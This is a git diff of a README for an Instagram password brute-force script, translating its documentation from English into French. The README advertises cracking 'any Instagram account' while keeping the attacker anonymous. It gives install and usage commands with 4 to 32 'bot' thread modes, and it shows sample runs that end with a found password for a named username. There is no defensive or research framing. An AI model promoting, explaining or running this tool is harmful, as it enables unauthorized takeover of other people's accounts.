@@ -2,115 +2,108 @@
 
 [![Donate](https://img.shields.io/badge/PayPal-donate-orange)](https://www.paypal.me/AlexxModder)
 
-This program will brute force any Instagram account you send it its way. Just give it a target, a password list and a mode then press enter and forget about it. No need to worry about anonymity when using this program, its highest priority is your anonymity, it only attacks when your identity is hidden.
+Ce programme va forcer brutalement n’importe quel compte Instagram que vous l’envoyez à sa façon.
+Il suffit de lui donner une cible, une liste de mots de passe et un mode, puis appuyez sur entrez et oubliez-le.
+Pas besoin de s’inquiéter de l’anonymat lors de l’utilisation de ce programme, sa plus haute priorité est votre anonymat, 
+il n’attaque que lorsque votre identité est cachée.
 
-### NOTICE
 
-I'm no longer maintaining this project.
+### Avis
+Je ne maintiendrais plus ce projet.
 
-### Support me
+### Soutenez-moi
+> Portefeuille Bitcoin: 3JdbcHdKEV2xTmxoiwTd9xYxfQ7jBnGuB3 >> PayPal: https://www.paypal.me/AlexxModder
 
-> **Bitcoin wallet:** 3JdbcHdKEV2xTmxoiwTd9xYxfQ7jBnGuB3> >**PayPal:** https://www.paypal.me/AlexxModder
-
-### Requirements
-
--   Python _v3.x.x_
--   ~~Kali Linux 2.0~~
--   ~~TOR~~
-
-### Install Dependencies
+### Exigences
+- Python v3.x.x
+- ~~Kali Linux 2.0~~
+- ~~Tor~~
+### Installer des dépendances
 
 ```
 pip3 install -r requirements.txt
 ```
 
-### Help
-
+### Aide
 ```
 usage: instagram.py [-h] [-m MODE] username wordlist
 
 optional arguments:
   -m MODE, --mode MODE  modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots
 ```
-
-### Usage
+### Utilisation
 
 ```
-python3 instagram.py <username> <wordlist> -m <mode>
+python3 instagram.py <nom> <wordlist> -m <mode>
 ```
-
-### Bots(Threads)
-
--   4 bots: 64 passwords at a time
--   8 bots: 128 passwords at a time
--   16 bots: 256 passwords at a time
--   32 bots: 512 passwords at a time
+### Bots (Threads)
+- 4 bots: 64 mots de passe à la fois
+- 8 bots: 128 mots de passe à la fois
+- 16 bots: 256 mots de passe à la fois
+- 32 bots: 512 mots de passe à la fois
 
 ### Modes
-
--   0: 32 bots
--   1: 16 bots
--   2: 8 bots
--   3: 4 bots
-
-### Chill mode
-
-This mode uses only 4 bots, or 64 passwords at a time.
+- 0: 32 bots
+- 1: 16 bots
+- 2: 8 bots
+- 3: 4 bots
+Mode chill
+Ce mode n’utilise que 4 bots, soit 64 mots de passe à la fois.
 
 ```
-C:\Users\kali\Desktop\Instagram>python3 instagram.py Sami09.1 pass.lst -m 3
+C:\Users\kali\Desktop\Instagram>python3 instagram.py AlexxLy password.lst -m 3
 ```
+### Mode modéré 1
 
-### Moderate mode 1
-
-This mode uses 8 bots, or 128 passwords at a time.
-
-```
-C:\Users\kali\Desktop\Instagram>python3 instagram.py Sami09.1 pass.lst -m 2
-```
-
-### Moderate mode 2
-
-This mode uses 16 bots, or 256 passwords at a time.
+Ce mode utilise 8 bots, soit 128 mots de passe à la fois.
 
 ```
-C:\Users\kali\Desktop\Instagram>python3 instagram.py Sami09.1 pass.lst -m 1
+C:\Users\kali\Desktop\Instagram>python3 instagram.py AlexxLy password.lst -m 2
 ```
 
-### Savage mode
+### Mode modéré 2
 
-This mode uses 32 bots, or 512 passwords at a time.
-
-```
-C:\Users\kali\Desktop\Instagram>python3 instagram.py Sami09.1 pass.lst -m 0
-```
-
-### If you don't specify a mode, then mode is set to 2
-
-### Run
+Ce mode utilise 16 bots, soit 256 mots de passe à la fois.
 
 ```
-[-] Wordlist: pass.lst
-[-] Username: Sami09.1
-[-] Password: 272
-[-] Complete: 45.51%
-[-] Attempts: 228
-[-] Browsers: 273
-[-] Exists: True
+C:\Users\kali\Desktop\Instagram>python3 instagram.py AlexxLy password.lst -m 1
 ```
 
-### Stop
+### Mode sauvage
+
+Ce mode utilise 32 bots, soit 512 mots de passe à la fois.
 
 ```
-[-] Wordlist: pass.lst
-[-] Username: Sami09.1
-[-] Password: Sami123
-[-] Complete: 62.67%
-[-] Attempts: 314
-[-] Browsers: 185
-[-] Exists: True
-
-[!] Password Found
-[+] Username: Sami09.1
-[+] Password: Sami123
+C:\Users\kali\Desktop\Instagram>python3 instagram.py AlexxLy password.lst -m 0
 ```
+
+### Si vous ne spécifiez pas un mode, alors le mode est défini à 2
+
+### ENGLISH                      ||### FRANCAIS
+
+### Run                          ||### Courrir
+                                 ||
+```                              ||```                              
+[-] Wordlist: password.lst       ||[-] Liste de Mots de passe: password.lst
+[-] Username: AlexxLy            ||[-] Nom d'utilisateur: AlexxLy
+[-] Password: 272                ||[-] Mots de passe: 272
+[-] Complete: 34.80%             ||[-] Completer: 34.80%
+[-] Attempts: 212                ||[-] Essayer: 212
+[-] Browsers: 240                ||[-] Browsers: 240
+[-] Exists: True                 ||[-] Existe: OUI
+```                              ||```                              
+                                 ||
+### Stop                         ||### Arrete
+                                 ||
+```                              ||```                              
+[-] Wordlist: password.lst       ||[-] Liste de Mots de passe: password.lst
+[-] Username: AlexxLy            ||[-] Nom d'utilisateur: AlexxLy
+[-] Password: Alexx1212          ||[-] Mots de passe: Alexx1212
+[-] Complete: 86.69%             ||[-] Completer: 86.69%
+[-] Attempts: 345                ||[-] Essayer: 345
+[-] Browsers: 192                ||[-] Browsers: 192
+[-] Exists: True                 ||[-] Existe: OUI
+                                 ||
+[!] Password Found               ||[!] Mots de passe Trouver
+[+] Username: AlexxLy            ||[+] Nom d'utilisateur: AlexxLy
+[+] Password: Alexx1212          ||[+] Mots de passe: Alexx1212
